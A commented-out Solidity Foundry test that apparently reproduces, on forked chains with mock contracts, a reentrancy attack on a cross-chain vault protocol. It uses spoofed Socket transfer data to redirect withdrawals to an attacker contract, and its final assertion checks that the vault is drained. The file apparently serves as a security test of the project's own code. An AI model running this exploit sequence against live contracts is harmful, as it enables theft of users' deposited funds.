// SPDX-License-Identifier: MIT
/*
pragma solidity ^0.8.14;

// Contracts
import {Attack} from "contracts/attack/Attack.sol";
import "contracts/types/socketTypes.sol";
import "contracts/types/lzTypes.sol";

// Test Utils
import {MockERC20} from "./mocks/MockERC20.sol";
import "./utils/BaseSetup.sol";


struct BuildAttackArgs {
    address attackingContract;
    address fromSrc;
    address toDst;
    address underlyingDstToken;
    uint256 targetVaultId;
    uint256 amount;
    uint16 srcChainId;
    uint16 toChainId;
}

struct TestAttackVars {
    Vm.Log[] logs;
    StateReq[] stateReqs;
    LiqRequest[] liqReqs;
    StateReq stateReq;
    LiqRequest liqReq;
    MockERC20 VICTIM_VAULT;
    uint16 CHAIN_0;
    uint16 CHAIN_1;
    uint256 victimVault;
    uint256 amountsToDeposit;
    uint256 CHAIN_0_PAYLOAD_ID;
    uint256 CHAIN_1_PAYLOAD_ID;
    uint256 sharesBalanceBeforeWithdraw;
    uint256 assetsToStealEachLoop;
    address vaultMock;
    address underlyingSrcToken;
    address underlyingDstToken;
    address payable fromSrc;
    address payable toDst;
}



contract AttackTest is BaseSetup {
    Attack internal attackCHAIN_0;
    Attack internal attackCHAIN_1;
    uint16 internal CHAIN_0;
    uint16 internal CHAIN_1;
    address lzEndpoint_0;
    address lzEndpoint_1;

    function setUp() public override {


        UNDERLYING_TOKEN = "DAI";
        CHAIN_0 = FTM;
        CHAIN_1 = POLY; // issue with FTM reverts



        super.setUp();

        lzEndpoint_0 = LZ_ENDPOINTS[CHAIN_0];
        lzEndpoint_1 = LZ_ENDPOINTS[CHAIN_1];



        /// @dev deploy attacking contract on src and dst chain
        address payable chain0_SuperRouter = payable(
            getContract(CHAIN_0, "SuperRouter")
        );

        address payable chain1_StateHandler = payable(
            getContract(CHAIN_1, "StateHandler")
        );

        address payable chain1_SuperDestination = payable(
            getContract(CHAIN_1, "SuperDestination")
        );

        address chain1_TOKEN = getContract(CHAIN_1, UNDERLYING_TOKEN);

        address chain1_TOKENVault = getContract(CHAIN_1, VAULT_NAME);

        vm.selectFork(FORKS[CHAIN_0]);
        vm.startPrank(deployer);

        attackCHAIN_0 = new Attack(
            chain0_SuperRouter,
            chain1_StateHandler,
            chain1_SuperDestination,
            chain1_TOKEN,
            chain1_TOKENVault
        );

        MockERC20 chain0_TOKEN = MockERC20(
            super.getContract(CHAIN_0, UNDERLYING_TOKEN)
        );

        chain0_TOKEN.transfer(address(attackCHAIN_0), milionTokensE18 / 100);

        vm.selectFork(FORKS[CHAIN_1]);

        attackCHAIN_1 = new Attack(
            chain0_SuperRouter,
            chain1_StateHandler,
            chain1_SuperDestination,
            chain1_TOKEN,
            chain1_TOKENVault
        );

        vm.stopPrank();
    }



    function test_attack_contract_same_address() public {
        assertEq(address(attackCHAIN_0), address(attackCHAIN_1));
    }



    /// @dev This is a test of an end to end possible attack. Testing individual parts (unit tests) can be taken from here
    function test_attack() public {
        TestAttackVars memory vars;

        vars.victimVault = 1; // should correspond to TOKEN vault
        vars.amountsToDeposit = 1000;
        vars.CHAIN_0_PAYLOAD_ID;
        vars.CHAIN_1_PAYLOAD_ID;
        vars.underlyingSrcToken = getContract(CHAIN_0, UNDERLYING_TOKEN);
        vars.underlyingDstToken = getContract(CHAIN_1, UNDERLYING_TOKEN);

        vars.fromSrc = payable(getContract(CHAIN_0, "SuperRouter"));
        vars.toDst = payable(getContract(CHAIN_1, "SuperDestination"));

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
            BuildCallDataArgs(
                vars.fromSrc,
                vars.toDst,
                vars.underlyingSrcToken,
                vars.victimVault,
                vars.amountsToDeposit,
                CHAIN_0,
                CHAIN_1
            )
        );

        vars.VICTIM_VAULT = MockERC20(getContract(CHAIN_1, UNDERLYING_TOKEN));
        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            vars.VICTIM_VAULT.balanceOf(
                getContract(CHAIN_1, "SuperDestination")
            ),
            0
        );

        StateReq[] memory stateReqs = new StateReq[](1);
        LiqRequest[] memory liqReqs = new LiqRequest[](1);

        stateReqs[0] = vars.stateReq;
        liqReqs[0] = vars.liqReq;

        /// @dev fund the vault with 10000 TOKEN
        for (uint256 i = 0; i < users.length; i++) {
            _depositToVault(
                InternalActionArgs(
                    vars.underlyingSrcToken,
                    vars.fromSrc,
                    vars.toDst,
                    lzEndpoint_1,
                    users[i],
                    stateReqs,
                    liqReqs,
                    vars.amountsToDeposit,
                    CHAIN_0,
                    CHAIN_1,
                    ""
                )
            );
        }

        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            vars.VICTIM_VAULT.balanceOf(vars.toDst),
            vars.amountsToDeposit * users.length
        );

        /// @dev Update state on src and dst and process payload on dst
        /// @notice this will mint to the users the super positions
        for (uint256 i = 0; i < users.length; i++) {
            unchecked {
                vars.CHAIN_1_PAYLOAD_ID++;
            }
            _updateState(
                vars.CHAIN_1_PAYLOAD_ID,
                vars.amountsToDeposit,
                CHAIN_1
            );

            vm.recordLogs();
            _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);

            vars.logs = vm.getRecordedLogs();
            LayerZeroHelper(getContract(CHAIN_1, "LayerZeroHelper"))
                .helpWithEstimates(
                    lzEndpoint_0,
                    1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                    FORKS[CHAIN_0],
                    vars.logs
                );

            unchecked {
                vars.CHAIN_0_PAYLOAD_ID++;
            }

            _processPayload(vars.CHAIN_0_PAYLOAD_ID, CHAIN_0);

            vm.selectFork(FORKS[CHAIN_0]);
            assertEq(
                SuperRouter(vars.fromSrc).balanceOf(users[i], 1),
                vars.amountsToDeposit
            );
        }

        vars.vaultMock = getContract(CHAIN_1, VAULT_NAME);
        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            VaultMock(vars.vaultMock).balanceOf(vars.toDst),
            vars.amountsToDeposit * users.length
        );

        /// @dev Step 1 - deposit from the source attacker contract
        /// @dev Attack starts from the attacking contract which is the 'user'
        /// @dev Notice no parameters are changed here from the same kind of requests the other users did

        uint256 msgValue = 1 * _getPriceMultiplier(CHAIN_0) * 1e18;

        vm.selectFork(FORKS[CHAIN_0]);
        vm.prank(deployer);
        attackCHAIN_0.depositIntoRouter{value: msgValue}(
            vars.liqReqs,
            vars.stateReqs
        );
        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(CHAIN_0, "LayerZeroHelper"))
            .helpWithEstimates(
                lzEndpoint_1,
                1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                FORKS[CHAIN_1],
                vars.logs
            );

        vars.CHAIN_1_PAYLOAD_ID++;
        _updateState(vars.CHAIN_1_PAYLOAD_ID, vars.amountsToDeposit, CHAIN_1);

        _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);

        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(CHAIN_1, "LayerZeroHelper"))
            .helpWithEstimates(
                lzEndpoint_0,
                1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                FORKS[CHAIN_0],
                vars.logs
            );

        vars.CHAIN_0_PAYLOAD_ID++;
        _processPayload(vars.CHAIN_0_PAYLOAD_ID, CHAIN_0);
        vars.sharesBalanceBeforeWithdraw = SuperRouter(vars.fromSrc).balanceOf(
            address(attackCHAIN_0),
            1
        );
        assertEq(vars.sharesBalanceBeforeWithdraw, vars.amountsToDeposit);

        /// @dev Step 2 - Attacker previews how many assets he will be stealing from the vault in each reentrancy
        // Specifically he could choose to do  BscVaultBalanceAtBeginningOfAttack/sharesBalanceBeforeWithdraw (rounded down) reentrancies

        vm.selectFork(FORKS[CHAIN_1]);

        vars.assetsToStealEachLoop = VaultMock(vars.vaultMock).previewRedeem(
            vars.sharesBalanceBeforeWithdraw
        );

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildWithdrawAttackCallData(
            BuildAttackArgs(
                address(attackCHAIN_1),
                vars.fromSrc,
                vars.toDst,
                vars.underlyingSrcToken,
                vars.victimVault,
                vars.amountsToDeposit,
                CHAIN_0,
                CHAIN_1
            )
        );
        vars.stateReqs[0] = vars.stateReq;
        vars.liqReqs[0] = vars.liqReq;
        /// @dev airdrop 99 Native tokens to socket in both chain
        vm.startPrank(deployer);

        vm.selectFork(FORKS[CHAIN_0]);
        payable(getContract(CHAIN_0, "SocketRouterMockFork")).transfer(
            99 ether
        );

        vm.selectFork(FORKS[CHAIN_1]);
        payable(getContract(CHAIN_1, "SocketRouterMockFork")).transfer(
            99 ether
        );

        vm.stopPrank();

        /// @dev Step 3 - A normal withdrawal from the SourceChain is inititated by the attacker contract
        /// @dev This chain is where the SuperPositions are stored
        msgValue = 1 * _getPriceMultiplier(CHAIN_0) * 1e18;

        vm.selectFork(FORKS[CHAIN_0]);
        vm.prank(deployer);
        attackCHAIN_0.withdrawFromRouter{value: msgValue}(
            vars.liqReqs,
            vars.stateReqs
        );
        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(CHAIN_0, "LayerZeroHelper"))
            .helpWithEstimates(
                lzEndpoint_1,
                1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                FORKS[CHAIN_1],
                vars.logs
            );

        /// @dev Step 4 - Reentrancy
        vars.CHAIN_1_PAYLOAD_ID++;
        _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);

        vm.selectFork(FORKS[CHAIN_1]);
        /// @dev WARNING - Asserts vault in chain1 has been drained
        assertEq(VaultMock(vars.vaultMock).balanceOf(vars.toDst), 0);
    }



    function _buildWithdrawAttackCallData(BuildAttackArgs memory args)
        internal
        returns (StateReq memory stateReq, LiqRequest memory liqReq)
    {
        /// @dev set to empty bytes for now
        bytes memory adapterParam;

        /// @dev only testing 1 vault at a time for now
        uint256[] memory amountsToDeposit = new uint256[](1);
        uint256[] memory targetVaultIds = new uint256[](1);
        uint256[] memory slippage = new uint256[](1);

        amountsToDeposit[0] = args.amount;
        targetVaultIds[0] = args.targetVaultId;
        slippage[0] = 1000;
        uint256 msgValue = 1 * _getPriceMultiplier(args.srcChainId) * 1e18;

        stateReq = StateReq(
            args.toChainId,
            amountsToDeposit,
            targetVaultIds,
            slippage,
            adapterParam,
            msgValue
        );

        /// @dev ! Notice - A new mock functon mockSocketTransferNative was added to the socket contract to allow this
        /// @dev ! Notice - This is valid because socket allows swaps between Token -> Native Currency in the same destination chain
        /// @dev ! Notice - without breaking the chain of call (DEX Swap)
        bytes memory spoofedTxData = abi.encodeWithSignature(
            "mockSocketTransferNative(address,address,address,uint256,uint256)",
            args.toDst,
            args.attackingContract, /// @dev <--- Attacker contract address in the destination chain replaces the destination of the socket transfer.
            args.underlyingDstToken,
            args.amount,
            FORKS[args.toChainId]
        );

        liqReq = LiqRequest(
            1,
            spoofedTxData,
            args.underlyingDstToken,
            getContract(args.srcChainId, "SocketRouterMockFork"),
            args.amount,
            0
        );
    }
}
*/
